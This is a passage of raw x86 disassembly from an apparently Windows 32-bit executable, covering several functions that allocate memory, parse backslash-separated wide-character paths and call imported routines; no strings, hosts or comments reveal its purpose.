  4058d1:	8b ec                	mov    %esp,%ebp
  4058d3:	83 e4 f8             	and    $0xfffffff8,%esp
  4058d6:	83 ec 20             	sub    $0x20,%esp
  4058d9:	56                   	push   %esi
  4058da:	57                   	push   %edi
  4058db:	e8 f0 0c 00 00       	call   0x4065d0
  4058e0:	6a 20                	push   $0x20
  4058e2:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4058e6:	6a 00                	push   $0x0
  4058e8:	50                   	push   %eax
  4058e9:	e8 12 b8 ff ff       	call   0x401100
  4058ee:	83 c4 0c             	add    $0xc,%esp
  4058f1:	6a 20                	push   $0x20
  4058f3:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4058f7:	51                   	push   %ecx
  4058f8:	6a 58                	push   $0x58
  4058fa:	68 00 08 00 00       	push   $0x800
  4058ff:	ff 15 d8 80 40 00    	call   *0x4080d8
  405905:	85 c0                	test   %eax,%eax
  405907:	74 0f                	je     0x405918
  405909:	8b 44 24 08          	mov    0x8(%esp),%eax
  40590d:	a9 00 02 00 00       	test   $0x200,%eax
  405912:	74 04                	je     0x405918
  405914:	85 c0                	test   %eax,%eax
  405916:	79 73                	jns    0x40598b
  405918:	e8 73 02 00 00       	call   0x405b90
  40591d:	84 c0                	test   %al,%al
  40591f:	74 6a                	je     0x40598b
  405921:	80 3d 0f 90 41 00 00 	cmpb   $0x0,0x41900f
  405928:	74 45                	je     0x40596f
  40592a:	8b 35 68 b2 41 00    	mov    0x41b268,%esi
  405930:	8b 3d 1c 90 41 00    	mov    0x41901c,%edi
  405936:	56                   	push   %esi
  405937:	c6 05 0b 90 40 00 01 	movb   $0x1,0x40900b
  40593e:	ff 15 44 81 40 00    	call   *0x408144
  405944:	56                   	push   %esi
  405945:	89 7e 20             	mov    %edi,0x20(%esi)
  405948:	ff 15 3c 81 40 00    	call   *0x40813c
  40594e:	8b 15 1c 90 41 00    	mov    0x41901c,%edx
  405954:	52                   	push   %edx
  405955:	e8 76 0c 00 00       	call   0x4065d0
  40595a:	83 c4 04             	add    $0x4,%esp
  40595d:	e8 ce d4 ff ff       	call   0x402e30
  405962:	33 c0                	xor    %eax,%eax
  405964:	e8 37 01 00 00       	call   0x405aa0
  405969:	5f                   	pop    %edi
  40596a:	5e                   	pop    %esi
  40596b:	8b e5                	mov    %ebp,%esp
  40596d:	5d                   	pop    %ebp
  40596e:	c3                   	ret
  40596f:	83 3d 40 b2 41 00 00 	cmpl   $0x0,0x41b240
  405976:	75 09                	jne    0x405981
  405978:	e8 b3 16 00 00       	call   0x407030
  40597d:	3c 01                	cmp    $0x1,%al
  40597f:	74 0a                	je     0x40598b
  405981:	e8 1a e9 ff ff       	call   0x4042a0
  405986:	e8 a5 0a 00 00       	call   0x406430
  40598b:	5f                   	pop    %edi
  40598c:	5e                   	pop    %esi
  40598d:	8b e5                	mov    %ebp,%esp
  40598f:	5d                   	pop    %ebp
  405990:	c3                   	ret
  405991:	cc                   	int3
  405992:	cc                   	int3
  405993:	cc                   	int3
  405994:	cc                   	int3
  405995:	cc                   	int3
  405996:	cc                   	int3
  405997:	cc                   	int3
  405998:	cc                   	int3
  405999:	cc                   	int3
  40599a:	cc                   	int3
  40599b:	cc                   	int3
  40599c:	cc                   	int3
  40599d:	cc                   	int3
  40599e:	cc                   	int3
  40599f:	cc                   	int3
  4059a0:	56                   	push   %esi
  4059a1:	57                   	push   %edi
  4059a2:	8b f0                	mov    %eax,%esi
  4059a4:	a1 58 b2 41 00       	mov    0x41b258,%eax
  4059a9:	6a 01                	push   $0x1
  4059ab:	50                   	push   %eax
  4059ac:	e8 0f b9 ff ff       	call   0x4012c0
  4059b1:	a1 58 b2 41 00       	mov    0x41b258,%eax
  4059b6:	e8 05 bb ff ff       	call   0x4014c0
  4059bb:	a1 58 b2 41 00       	mov    0x41b258,%eax
  4059c0:	e8 0b bc ff ff       	call   0x4015d0
  4059c5:	81 3d 30 b2 41 00 ff 	cmpl   $0x7fffffff,0x41b230
  4059cc:	ff ff 7f 
  4059cf:	75 05                	jne    0x4059d6
  4059d1:	e8 ba ef ff ff       	call   0x404990
  4059d6:	80 7c 24 0c 00       	cmpb   $0x0,0xc(%esp)
  4059db:	74 22                	je     0x4059ff
  4059dd:	e8 ee 0b 00 00       	call   0x4065d0
  4059e2:	e8 d9 e7 ff ff       	call   0x4041c0
  4059e7:	e8 e4 0b 00 00       	call   0x4065d0
  4059ec:	80 3d 0e 90 41 00 00 	cmpb   $0x0,0x41900e
  4059f3:	74 0a                	je     0x4059ff
  4059f5:	e8 36 12 00 00       	call   0x406c30
  4059fa:	e8 a1 12 00 00       	call   0x406ca0
  4059ff:	85 f6                	test   %esi,%esi
  405a01:	8b c6                	mov    %esi,%eax
  405a03:	75 05                	jne    0x405a0a
  405a05:	b8 30 9a 41 00       	mov    $0x419a30,%eax
  405a0a:	50                   	push   %eax
  405a0b:	e8 c0 0b 00 00       	call   0x4065d0
  405a10:	83 c4 04             	add    $0x4,%esp
  405a13:	85 f6                	test   %esi,%esi
  405a15:	8b c6                	mov    %esi,%eax
  405a17:	75 05                	jne    0x405a1e
  405a19:	b8 30 9a 41 00       	mov    $0x419a30,%eax
  405a1e:	50                   	push   %eax
  405a1f:	e8 fc bd ff ff       	call   0x401820
  405a24:	85 f6                	test   %esi,%esi
  405a26:	75 23                	jne    0x405a4b
  405a28:	8b 0d 58 b2 41 00    	mov    0x41b258,%ecx
  405a2e:	51                   	push   %ecx
  405a2f:	e8 8c bf ff ff       	call   0x4019c0
  405a34:	8b 15 84 b2 41 00    	mov    0x41b284,%edx
  405a3a:	52                   	push   %edx
  405a3b:	e8 e0 bd ff ff       	call   0x401820
  405a40:	a1 78 b2 41 00       	mov    0x41b278,%eax
  405a45:	50                   	push   %eax
  405a46:	e8 d5 bd ff ff       	call   0x401820
  405a4b:	a1 58 b2 41 00       	mov    0x41b258,%eax
  405a50:	85 c0                	test   %eax,%eax
  405a52:	8b 3d 90 80 40 00    	mov    0x408090,%edi
  405a58:	8b f0                	mov    %eax,%esi
  405a5a:	74 11                	je     0x405a6d
  405a5c:	e8 bf b7 ff ff       	call   0x401220
  405a61:	56                   	push   %esi
  405a62:	6a 00                	push   $0x0
  405a64:	ff d7                	call   *%edi
  405a66:	50                   	push   %eax
  405a67:	ff 15 8c 80 40 00    	call   *0x40808c
  405a6d:	6a 08                	push   $0x8
  405a6f:	6a 00                	push   $0x0
  405a71:	ff d7                	call   *%edi
  405a73:	50                   	push   %eax
  405a74:	ff 15 84 80 40 00    	call   *0x408084
  405a7a:	85 c0                	test   %eax,%eax
  405a7c:	74 15                	je     0x405a93
  405a7e:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  405a85:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  405a8b:	a3 58 b2 41 00       	mov    %eax,0x41b258
  405a90:	5f                   	pop    %edi
  405a91:	5e                   	pop    %esi
  405a92:	c3                   	ret
  405a93:	33 c0                	xor    %eax,%eax
  405a95:	5f                   	pop    %edi
  405a96:	a3 58 b2 41 00       	mov    %eax,0x41b258
  405a9b:	5e                   	pop    %esi
  405a9c:	c3                   	ret
  405a9d:	cc                   	int3
  405a9e:	cc                   	int3
  405a9f:	cc                   	int3
  405aa0:	51                   	push   %ecx
  405aa1:	80 3d 0b 90 40 00 00 	cmpb   $0x0,0x40900b
  405aa8:	56                   	push   %esi
  405aa9:	57                   	push   %edi
  405aaa:	8b f0                	mov    %eax,%esi
  405aac:	0f 84 cc 00 00 00    	je     0x405b7e
  405ab2:	a1 64 b2 41 00       	mov    0x41b264,%eax
  405ab7:	6a 00                	push   $0x0
  405ab9:	50                   	push   %eax
  405aba:	e8 01 b8 ff ff       	call   0x4012c0
  405abf:	a1 64 b2 41 00       	mov    0x41b264,%eax
  405ac4:	e8 f7 b9 ff ff       	call   0x4014c0
  405ac9:	a1 64 b2 41 00       	mov    0x41b264,%eax
  405ace:	e8 fd ba ff ff       	call   0x4015d0
  405ad3:	81 3d 30 b2 41 00 ff 	cmpl   $0x7fffffff,0x41b230
  405ada:	ff ff 7f 
  405add:	75 05                	jne    0x405ae4
  405adf:	e8 ac ee ff ff       	call   0x404990
  405ae4:	85 f6                	test   %esi,%esi
  405ae6:	74 0f                	je     0x405af7
  405ae8:	8b 0d 64 b2 41 00    	mov    0x41b264,%ecx
  405aee:	56                   	push   %esi
  405aef:	51                   	push   %ecx
  405af0:	e8 7b c1 ff ff       	call   0x401c70
  405af5:	eb 37                	jmp    0x405b2e
  405af7:	8b 15 64 b2 41 00    	mov    0x41b264,%edx
  405afd:	52                   	push   %edx
  405afe:	e8 bd be ff ff       	call   0x4019c0
  405b03:	a1 64 b2 41 00       	mov    0x41b264,%eax
  405b08:	6a 00                	push   $0x0
  405b0a:	6a 00                	push   $0x0
  405b0c:	50                   	push   %eax
  405b0d:	68 20 53 40 00       	push   $0x405320
  405b12:	6a 00                	push   $0x0
  405b14:	6a 00                	push   $0x0
  405b16:	ff 15 14 81 40 00    	call   *0x408114
  405b1c:	8b f0                	mov    %eax,%esi
  405b1e:	6a ff                	push   $0xffffffff
  405b20:	56                   	push   %esi
  405b21:	ff 15 10 81 40 00    	call   *0x408110
  405b27:	56                   	push   %esi
  405b28:	ff 15 48 81 40 00    	call   *0x408148
  405b2e:	a1 64 b2 41 00       	mov    0x41b264,%eax
  405b33:	85 c0                	test   %eax,%eax
  405b35:	8b 3d 90 80 40 00    	mov    0x408090,%edi
  405b3b:	8b f0                	mov    %eax,%esi
  405b3d:	74 11                	je     0x405b50
  405b3f:	e8 dc b6 ff ff       	call   0x401220
  405b44:	56                   	push   %esi
  405b45:	6a 00                	push   $0x0
  405b47:	ff d7                	call   *%edi
  405b49:	50                   	push   %eax
  405b4a:	ff 15 8c 80 40 00    	call   *0x40808c
  405b50:	6a 08                	push   $0x8
  405b52:	6a 00                	push   $0x0
  405b54:	ff d7                	call   *%edi
  405b56:	50                   	push   %eax
  405b57:	ff 15 84 80 40 00    	call   *0x408084
  405b5d:	85 c0                	test   %eax,%eax
  405b5f:	74 16                	je     0x405b77
  405b61:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  405b68:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  405b6e:	a3 64 b2 41 00       	mov    %eax,0x41b264
  405b73:	5f                   	pop    %edi
  405b74:	5e                   	pop    %esi
  405b75:	59                   	pop    %ecx
  405b76:	c3                   	ret
  405b77:	33 c0                	xor    %eax,%eax
  405b79:	a3 64 b2 41 00       	mov    %eax,0x41b264
  405b7e:	5f                   	pop    %edi
  405b7f:	5e                   	pop    %esi
  405b80:	59                   	pop    %ecx
  405b81:	c3                   	ret
  405b82:	cc                   	int3
  405b83:	cc                   	int3
  405b84:	cc                   	int3
  405b85:	cc                   	int3
  405b86:	cc                   	int3
  405b87:	cc                   	int3
  405b88:	cc                   	int3
  405b89:	cc                   	int3
  405b8a:	cc                   	int3
  405b8b:	cc                   	int3
  405b8c:	cc                   	int3
  405b8d:	cc                   	int3
  405b8e:	cc                   	int3
  405b8f:	cc                   	int3
  405b90:	51                   	push   %ecx
  405b91:	53                   	push   %ebx
  405b92:	55                   	push   %ebp
  405b93:	8b 2d 90 80 40 00    	mov    0x408090,%ebp
  405b99:	56                   	push   %esi
  405b9a:	57                   	push   %edi
  405b9b:	6a 04                	push   $0x4
  405b9d:	33 db                	xor    %ebx,%ebx
  405b9f:	53                   	push   %ebx
  405ba0:	ff d5                	call   *%ebp
  405ba2:	50                   	push   %eax
  405ba3:	ff 15 84 80 40 00    	call   *0x408084
  405ba9:	3b c3                	cmp    %ebx,%eax
  405bab:	74 04                	je     0x405bb1
  405bad:	89 18                	mov    %ebx,(%eax)
  405baf:	eb 02                	jmp    0x405bb3
  405bb1:	33 c0                	xor    %eax,%eax
  405bb3:	a3 7c b2 41 00       	mov    %eax,0x41b27c
  405bb8:	8d 44 24 10          	lea    0x10(%esp),%eax
  405bbc:	50                   	push   %eax
  405bbd:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405bc2:	6a 04                	push   $0x4
  405bc4:	e8 87 cd ff ff       	call   0x402950
  405bc9:	8b f0                	mov    %eax,%esi
  405bcb:	3b f3                	cmp    %ebx,%esi
  405bcd:	74 1a                	je     0x405be9
  405bcf:	8b 3d 7c b2 41 00    	mov    0x41b27c,%edi
  405bd5:	3b fb                	cmp    %ebx,%edi
  405bd7:	74 10                	je     0x405be9
  405bd9:	e8 32 d4 ff ff       	call   0x403010
  405bde:	56                   	push   %esi
  405bdf:	53                   	push   %ebx
  405be0:	ff d5                	call   *%ebp
  405be2:	50                   	push   %eax
  405be3:	ff 15 8c 80 40 00    	call   *0x40808c
  405be9:	6a 04                	push   $0x4
  405beb:	53                   	push   %ebx
  405bec:	ff d5                	call   *%ebp
  405bee:	50                   	push   %eax
  405bef:	ff 15 84 80 40 00    	call   *0x408084
  405bf5:	3b c3                	cmp    %ebx,%eax
  405bf7:	74 04                	je     0x405bfd
  405bf9:	89 18                	mov    %ebx,(%eax)
  405bfb:	eb 02                	jmp    0x405bff
  405bfd:	33 c0                	xor    %eax,%eax
  405bff:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  405c03:	51                   	push   %ecx
  405c04:	a3 3c b2 41 00       	mov    %eax,0x41b23c
  405c09:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405c0e:	6a 27                	push   $0x27
  405c10:	e8 3b cd ff ff       	call   0x402950
  405c15:	8b f0                	mov    %eax,%esi
  405c17:	3b f3                	cmp    %ebx,%esi
  405c19:	74 1a                	je     0x405c35
  405c1b:	8b 3d 3c b2 41 00    	mov    0x41b23c,%edi
  405c21:	3b fb                	cmp    %ebx,%edi
  405c23:	74 10                	je     0x405c35
  405c25:	e8 e6 d3 ff ff       	call   0x403010
  405c2a:	56                   	push   %esi
  405c2b:	53                   	push   %ebx
  405c2c:	ff d5                	call   *%ebp
  405c2e:	50                   	push   %eax
  405c2f:	ff 15 8c 80 40 00    	call   *0x40808c
  405c35:	6a 04                	push   $0x4
  405c37:	53                   	push   %ebx
  405c38:	ff d5                	call   *%ebp
  405c3a:	50                   	push   %eax
  405c3b:	ff 15 84 80 40 00    	call   *0x408084
  405c41:	3b c3                	cmp    %ebx,%eax
  405c43:	74 04                	je     0x405c49
  405c45:	89 18                	mov    %ebx,(%eax)
  405c47:	eb 02                	jmp    0x405c4b
  405c49:	33 c0                	xor    %eax,%eax
  405c4b:	8d 54 24 10          	lea    0x10(%esp),%edx
  405c4f:	52                   	push   %edx
  405c50:	a3 34 b2 41 00       	mov    %eax,0x41b234
  405c55:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405c5a:	6a 28                	push   $0x28
  405c5c:	e8 ef cc ff ff       	call   0x402950
  405c61:	8b f0                	mov    %eax,%esi
  405c63:	3b f3                	cmp    %ebx,%esi
  405c65:	74 1a                	je     0x405c81
  405c67:	8b 3d 34 b2 41 00    	mov    0x41b234,%edi
  405c6d:	3b fb                	cmp    %ebx,%edi
  405c6f:	74 10                	je     0x405c81
  405c71:	e8 9a d3 ff ff       	call   0x403010
  405c76:	56                   	push   %esi
  405c77:	53                   	push   %ebx
  405c78:	ff d5                	call   *%ebp
  405c7a:	50                   	push   %eax
  405c7b:	ff 15 8c 80 40 00    	call   *0x40808c
  405c81:	6a 04                	push   $0x4
  405c83:	53                   	push   %ebx
  405c84:	ff d5                	call   *%ebp
  405c86:	8b 35 84 80 40 00    	mov    0x408084,%esi
  405c8c:	50                   	push   %eax
  405c8d:	ff d6                	call   *%esi
  405c8f:	3b c3                	cmp    %ebx,%eax
  405c91:	74 04                	je     0x405c97
  405c93:	89 18                	mov    %ebx,(%eax)
  405c95:	eb 02                	jmp    0x405c99
  405c97:	33 c0                	xor    %eax,%eax
  405c99:	6a 04                	push   $0x4
  405c9b:	53                   	push   %ebx
  405c9c:	a3 18 90 41 00       	mov    %eax,0x419018
  405ca1:	ff d5                	call   *%ebp
  405ca3:	50                   	push   %eax
  405ca4:	ff d6                	call   *%esi
  405ca6:	3b c3                	cmp    %ebx,%eax
  405ca8:	74 04                	je     0x405cae
  405caa:	89 18                	mov    %ebx,(%eax)
  405cac:	eb 02                	jmp    0x405cb0
  405cae:	33 c0                	xor    %eax,%eax
  405cb0:	a3 38 b2 41 00       	mov    %eax,0x41b238
  405cb5:	8d 44 24 10          	lea    0x10(%esp),%eax
  405cb9:	50                   	push   %eax
  405cba:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405cbf:	6a 1b                	push   $0x1b
  405cc1:	e8 8a cc ff ff       	call   0x402950
  405cc6:	8b f0                	mov    %eax,%esi
  405cc8:	3b f3                	cmp    %ebx,%esi
  405cca:	74 1a                	je     0x405ce6
  405ccc:	8b 3d 38 b2 41 00    	mov    0x41b238,%edi
  405cd2:	3b fb                	cmp    %ebx,%edi
  405cd4:	74 10                	je     0x405ce6
  405cd6:	e8 35 d3 ff ff       	call   0x403010
  405cdb:	56                   	push   %esi
  405cdc:	53                   	push   %ebx
  405cdd:	ff d5                	call   *%ebp
  405cdf:	50                   	push   %eax
  405ce0:	ff 15 8c 80 40 00    	call   *0x40808c
  405ce6:	6a 24                	push   $0x24
  405ce8:	53                   	push   %ebx
  405ce9:	ff d5                	call   *%ebp
  405ceb:	8b 3d 84 80 40 00    	mov    0x408084,%edi
  405cf1:	50                   	push   %eax
  405cf2:	ff d7                	call   *%edi
  405cf4:	8b f0                	mov    %eax,%esi
  405cf6:	3b f3                	cmp    %ebx,%esi
  405cf8:	74 12                	je     0x405d0c
  405cfa:	56                   	push   %esi
  405cfb:	ff 15 40 81 40 00    	call   *0x408140
  405d01:	89 5e 1c             	mov    %ebx,0x1c(%esi)
  405d04:	89 5e 18             	mov    %ebx,0x18(%esi)
  405d07:	89 5e 20             	mov    %ebx,0x20(%esi)
  405d0a:	eb 02                	jmp    0x405d0e
  405d0c:	33 f6                	xor    %esi,%esi
  405d0e:	6a 08                	push   $0x8
  405d10:	53                   	push   %ebx
  405d11:	89 35 68 b2 41 00    	mov    %esi,0x41b268
  405d17:	ff d5                	call   *%ebp
  405d19:	50                   	push   %eax
  405d1a:	ff d7                	call   *%edi
  405d1c:	3b c3                	cmp    %ebx,%eax
  405d1e:	74 07                	je     0x405d27
  405d20:	89 18                	mov    %ebx,(%eax)
  405d22:	89 58 04             	mov    %ebx,0x4(%eax)
  405d25:	eb 02                	jmp    0x405d29
  405d27:	33 c0                	xor    %eax,%eax
  405d29:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  405d2d:	51                   	push   %ecx
  405d2e:	a3 4c b2 41 00       	mov    %eax,0x41b24c
  405d33:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405d38:	6a 33                	push   $0x33
  405d3a:	e8 11 cc ff ff       	call   0x402950
  405d3f:	8b f0                	mov    %eax,%esi
  405d41:	3b f3                	cmp    %ebx,%esi
  405d43:	74 18                	je     0x405d5d
  405d45:	39 1d 4c b2 41 00    	cmp    %ebx,0x41b24c
  405d4b:	74 10                	je     0x405d5d
  405d4d:	e8 6e d4 ff ff       	call   0x4031c0
  405d52:	56                   	push   %esi
  405d53:	53                   	push   %ebx
  405d54:	ff d5                	call   *%ebp
  405d56:	50                   	push   %eax
  405d57:	ff 15 8c 80 40 00    	call   *0x40808c
  405d5d:	89 1d 74 b2 41 00    	mov    %ebx,0x41b274
  405d63:	ff 15 84 81 40 00    	call   *0x408184
  405d69:	3b c3                	cmp    %ebx,%eax
  405d6b:	74 16                	je     0x405d83
  405d6d:	68 74 b2 41 00       	push   $0x41b274
  405d72:	50                   	push   %eax
  405d73:	ff 15 8c 81 40 00    	call   *0x40818c
  405d79:	85 c0                	test   %eax,%eax
  405d7b:	75 06                	jne    0x405d83
  405d7d:	89 1d 74 b2 41 00    	mov    %ebx,0x41b274
  405d83:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405d88:	8d 54 24 10          	lea    0x10(%esp),%edx
  405d8c:	52                   	push   %edx
  405d8d:	6a 18                	push   $0x18
  405d8f:	e8 bc cb ff ff       	call   0x402950
  405d94:	a3 24 90 41 00       	mov    %eax,0x419024
  405d99:	8d 44 24 10          	lea    0x10(%esp),%eax
  405d9d:	50                   	push   %eax
  405d9e:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405da3:	53                   	push   %ebx
  405da4:	e8 a7 cb ff ff       	call   0x402950
  405da9:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  405dad:	51                   	push   %ecx
  405dae:	a3 88 b2 41 00       	mov    %eax,0x41b288
  405db3:	a1 80 b2 41 00       	mov    0x41b280,%eax
  405db8:	6a 12                	push   $0x12
  405dba:	e8 91 cb ff ff       	call   0x402950
  405dbf:	6a 19                	push   $0x19
  405dc1:	a3 70 b2 41 00       	mov    %eax,0x41b270
  405dc6:	e8 25 10 00 00       	call   0x406df0
  405dcb:	83 c4 04             	add    $0x4,%esp
  405dce:	6a 25                	push   $0x25
  405dd0:	a3 5c b2 41 00       	mov    %eax,0x41b25c
  405dd5:	e8 16 10 00 00       	call   0x406df0
  405dda:	8b 15 5c b2 41 00    	mov    0x41b25c,%edx
  405de0:	83 c4 04             	add    $0x4,%esp
  405de3:	8b f8                	mov    %eax,%edi
  405de5:	57                   	push   %edi
  405de6:	52                   	push   %edx
  405de7:	89 3d 44 b2 41 00    	mov    %edi,0x41b244
  405ded:	e8 de 07 00 00       	call   0x4065d0
  405df2:	83 c4 08             	add    $0x8,%esp
  405df5:	3b d3                	cmp    %ebx,%edx
  405df7:	0f 84 3f 01 00 00    	je     0x405f3c
  405dfd:	3b fb                	cmp    %ebx,%edi
  405dff:	0f 84 37 01 00 00    	je     0x405f3c
  405e05:	0f b7 0a             	movzwl (%edx),%ecx
  405e08:	66 3b cb             	cmp    %bx,%cx
  405e0b:	8b c2                	mov    %edx,%eax
  405e0d:	74 15                	je     0x405e24
  405e0f:	0f b7 c9             	movzwl %cx,%ecx
  405e12:	66 83 f9 5c          	cmp    $0x5c,%cx
  405e16:	74 16                	je     0x405e2e
  405e18:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  405e1c:	83 c0 02             	add    $0x2,%eax
  405e1f:	66 3b cb             	cmp    %bx,%cx
  405e22:	75 ee                	jne    0x405e12
  405e24:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405e28:	74 04                	je     0x405e2e
  405e2a:	33 f6                	xor    %esi,%esi
  405e2c:	eb 11                	jmp    0x405e3f
  405e2e:	83 c0 02             	add    $0x2,%eax
  405e31:	e8 5a e2 ff ff       	call   0x404090
  405e36:	8b f0                	mov    %eax,%esi
  405e38:	3b f3                	cmp    %ebx,%esi
  405e3a:	74 03                	je     0x405e3f
  405e3c:	66 89 1e             	mov    %bx,(%esi)
  405e3f:	8b c2                	mov    %edx,%eax
  405e41:	66 8b 08             	mov    (%eax),%cx
  405e44:	83 c0 02             	add    $0x2,%eax
  405e47:	66 85 c9             	test   %cx,%cx
  405e4a:	75 f5                	jne    0x405e41
  405e4c:	2b c2                	sub    %edx,%eax
  405e4e:	d1 f8                	sar    $1,%eax
  405e50:	03 c0                	add    %eax,%eax
  405e52:	74 70                	je     0x405ec4
  405e54:	50                   	push   %eax
  405e55:	53                   	push   %ebx
  405e56:	ff d5                	call   *%ebp
  405e58:	50                   	push   %eax
  405e59:	ff 15 84 80 40 00    	call   *0x408084
  405e5f:	3b c3                	cmp    %ebx,%eax
  405e61:	a3 84 b2 41 00       	mov    %eax,0x41b284
  405e66:	74 24                	je     0x405e8c
  405e68:	8b 15 5c b2 41 00    	mov    0x41b25c,%edx
  405e6e:	8b fa                	mov    %edx,%edi
  405e70:	66 8b 07             	mov    (%edi),%ax
  405e73:	83 c7 02             	add    $0x2,%edi
  405e76:	66 85 c0             	test   %ax,%ax
  405e79:	75 f5                	jne    0x405e70
  405e7b:	8b 1d 84 b2 41 00    	mov    0x41b284,%ebx
  405e81:	2b fa                	sub    %edx,%edi
  405e83:	d1 ff                	sar    $1,%edi
  405e85:	e8 a6 e0 ff ff       	call   0x403f30
  405e8a:	33 db                	xor    %ebx,%ebx
  405e8c:	8b 3d 44 b2 41 00    	mov    0x41b244,%edi
  405e92:	3b f3                	cmp    %ebx,%esi
  405e94:	74 05                	je     0x405e9b
  405e96:	66 c7 06 5c 00       	movw   $0x5c,(%esi)
  405e9b:	0f b7 0f             	movzwl (%edi),%ecx
  405e9e:	66 3b cb             	cmp    %bx,%cx
  405ea1:	8b c7                	mov    %edi,%eax
  405ea3:	74 15                	je     0x405eba
  405ea5:	0f b7 c9             	movzwl %cx,%ecx
  405ea8:	66 83 f9 5c          	cmp    $0x5c,%cx
  405eac:	74 1e                	je     0x405ecc
  405eae:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  405eb2:	83 c0 02             	add    $0x2,%eax
  405eb5:	66 3b cb             	cmp    %bx,%cx
  405eb8:	75 ee                	jne    0x405ea8
  405eba:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405ebe:	74 0c                	je     0x405ecc
  405ec0:	33 f6                	xor    %esi,%esi
  405ec2:	eb 19                	jmp    0x405edd
  405ec4:	89 1d 84 b2 41 00    	mov    %ebx,0x41b284
  405eca:	eb c6                	jmp    0x405e92
  405ecc:	83 c0 02             	add    $0x2,%eax
  405ecf:	e8 bc e1 ff ff       	call   0x404090
  405ed4:	8b f0                	mov    %eax,%esi
  405ed6:	3b f3                	cmp    %ebx,%esi
  405ed8:	74 03                	je     0x405edd
  405eda:	66 89 1e             	mov    %bx,(%esi)
  405edd:	8b c7                	mov    %edi,%eax
  405edf:	90                   	nop
  405ee0:	66 8b 08             	mov    (%eax),%cx
  405ee3:	83 c0 02             	add    $0x2,%eax
  405ee6:	66 85 c9             	test   %cx,%cx
  405ee9:	75 f5                	jne    0x405ee0
  405eeb:	2b c7                	sub    %edi,%eax
  405eed:	d1 f8                	sar    $1,%eax
  405eef:	03 c0                	add    %eax,%eax
  405ef1:	74 3f                	je     0x405f32
  405ef3:	50                   	push   %eax
  405ef4:	6a 00                	push   $0x0
  405ef6:	ff d5                	call   *%ebp
  405ef8:	50                   	push   %eax
  405ef9:	ff 15 84 80 40 00    	call   *0x408084
  405eff:	8b d8                	mov    %eax,%ebx
  405f01:	85 db                	test   %ebx,%ebx
  405f03:	89 1d 78 b2 41 00    	mov    %ebx,0x41b278
  405f09:	74 1c                	je     0x405f27
  405f0b:	8b 15 44 b2 41 00    	mov    0x41b244,%edx
  405f11:	8b fa                	mov    %edx,%edi
  405f13:	66 8b 07             	mov    (%edi),%ax
  405f16:	83 c7 02             	add    $0x2,%edi
  405f19:	66 85 c0             	test   %ax,%ax
  405f1c:	75 f5                	jne    0x405f13
  405f1e:	2b fa                	sub    %edx,%edi
  405f20:	d1 ff                	sar    $1,%edi
  405f22:	e8 09 e0 ff ff       	call   0x403f30
  405f27:	85 f6                	test   %esi,%esi
  405f29:	74 17                	je     0x405f42
  405f2b:	66 c7 06 5c 00       	movw   $0x5c,(%esi)
  405f30:	eb 10                	jmp    0x405f42
  405f32:	33 db                	xor    %ebx,%ebx
  405f34:	89 1d 78 b2 41 00    	mov    %ebx,0x41b278
  405f3a:	eb eb                	jmp    0x405f27
  405f3c:	8b 1d 78 b2 41 00    	mov    0x41b278,%ebx
  405f42:	8b 0d 84 b2 41 00    	mov    0x41b284,%ecx
  405f48:	53                   	push   %ebx
  405f49:	51                   	push   %ecx
  405f4a:	e8 81 06 00 00       	call   0x4065d0
  405f4f:	6a 08                	push   $0x8
  405f51:	68 ff 00 00 00       	push   $0xff
  405f56:	68 00 90 40 00       	push   $0x409000
  405f5b:	e8 a0 b1 ff ff       	call   0x401100
  405f60:	83 c4 14             	add    $0x14,%esp
  405f63:	83 3d 88 b2 41 00 00 	cmpl   $0x0,0x41b288
  405f6a:	74 3e                	je     0x405faa
  405f6c:	83 3d 70 b2 41 00 00 	cmpl   $0x0,0x41b270
  405f73:	74 35                	je     0x405faa
  405f75:	83 3d 24 90 41 00 00 	cmpl   $0x0,0x419024
  405f7c:	74 2c                	je     0x405faa
  405f7e:	83 3d 5c b2 41 00 00 	cmpl   $0x0,0x41b25c
  405f85:	74 23                	je     0x405faa
  405f87:	83 3d 44 b2 41 00 00 	cmpl   $0x0,0x41b244
  405f8e:	74 1a                	je     0x405faa
  405f90:	83 3d 84 b2 41 00 00 	cmpl   $0x0,0x41b284
  405f97:	74 11                	je     0x405faa
  405f99:	83 3d 78 b2 41 00 00 	cmpl   $0x0,0x41b278
  405fa0:	74 08                	je     0x405faa
  405fa2:	b0 01                	mov    $0x1,%al
  405fa4:	5f                   	pop    %edi
  405fa5:	5e                   	pop    %esi
  405fa6:	5d                   	pop    %ebp
  405fa7:	5b                   	pop    %ebx
  405fa8:	59                   	pop    %ecx
  405fa9:	c3                   	ret
  405faa:	5f                   	pop    %edi
  405fab:	5e                   	pop    %esi
  405fac:	5d                   	pop    %ebp
  405fad:	32 c0                	xor    %al,%al
  405faf:	5b                   	pop    %ebx
  405fb0:	59                   	pop    %ecx
  405fb1:	c3                   	ret
  405fb2:	cc                   	int3
  405fb3:	cc                   	int3
  405fb4:	cc                   	int3
  405fb5:	cc                   	int3
  405fb6:	cc                   	int3
  405fb7:	cc                   	int3
  405fb8:	cc                   	int3
  405fb9:	cc                   	int3
  405fba:	cc                   	int3
  405fbb:	cc                   	int3
  405fbc:	cc                   	int3
  405fbd:	cc                   	int3
  405fbe:	cc                   	int3
  405fbf:	cc                   	int3
  405fc0:	81 ec 7c 08 00 00    	sub    $0x87c,%esp
  405fc6:	53                   	push   %ebx
  405fc7:	55                   	push   %ebp
  405fc8:	56                   	push   %esi
  405fc9:	8b 35 68 b2 41 00    	mov    0x41b268,%esi
  405fcf:	57                   	push   %edi
